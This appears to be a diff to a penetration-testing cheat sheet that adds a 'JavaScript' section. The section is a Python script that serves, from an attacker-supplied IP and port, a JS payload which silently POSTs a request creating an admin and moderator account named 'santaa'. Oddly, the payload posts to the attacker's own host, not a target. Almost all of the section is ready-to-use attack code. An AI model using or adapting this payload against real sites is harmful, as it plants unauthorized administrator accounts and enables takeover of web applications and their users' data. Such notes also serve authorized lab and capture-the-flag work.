@@ -30,6 +30,7 @@ data = {
 }
 
 response = session.post("https://example.com/api", data=data)
+# JSON: response = session.post("https://example.com/api", json=data)
 print(response.status_code)
 print(response.text)
 ```
@@ -253,3 +254,67 @@ if __name__ == "__main__":
     main()
 ```
 {% endcode %}
+
+## JavaScript
+
+Host JS in a webserver and wait for calls:
+
+```python
+import tempfile, argparse, os
+from http.server import HTTPServer, SimpleHTTPRequestHandler
+
+parser = argparse.ArgumentParser()
+#parser.add_argument('-t','--target', help='Victim IP', required=True)
+parser.add_argument('-l','--lhost', help='Attacker IP (tun0)', required=True)
+parser.add_argument('-lp','--lport', help='Attacker port', default=8000)
+args = parser.parse_args()
+lhost = args.lhost
+lport = args.lport
+
+def send_JS_payload():
+    # Create a temporary directory
+    with tempfile.TemporaryDirectory() as tmpdir:
+        filename = "payload.js"
+        filepath = os.path.join(tmpdir, filename)
+        js_data = f"""async function createUser() {{
+            const post_url = 'http://{lhost}:{lport}/admin/users/create';
+            const data = new URLSearchParams({{
+                name: 'santaa',
+                email: 'santaa@email.add',
+                isAdmin: 'true',
+                isMod: 'true'
+            }});
+
+            try {{
+                const response = await fetch(post_url, {{
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: {{
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    }},
+                    body: data.toString(),
+                }});
+                const result = await response.text();
+            }} catch (error) {{
+                console.error('Error:', error);
+            }}
+        }}
+
+        createUser();
+        """
+
+        # Write content to temp file
+        with open(filepath, "w") as f:
+            f.write(js_data)
+        print(f"[+] Temp file created at {filepath}")
+
+        # Serve that directory
+        os.chdir(tmpdir)
+        server = HTTPServer((lhost, lport), SimpleHTTPRequestHandler)
+        print(f"[*] Serving {filename} at http://{lhost}:{lport}/{filename}")
+        print("[*] Waiting for request...")
+        server.handle_request()
+        print("[*] Server stopped, temp file cleaned up")
+
+send_JS_payload()
+```
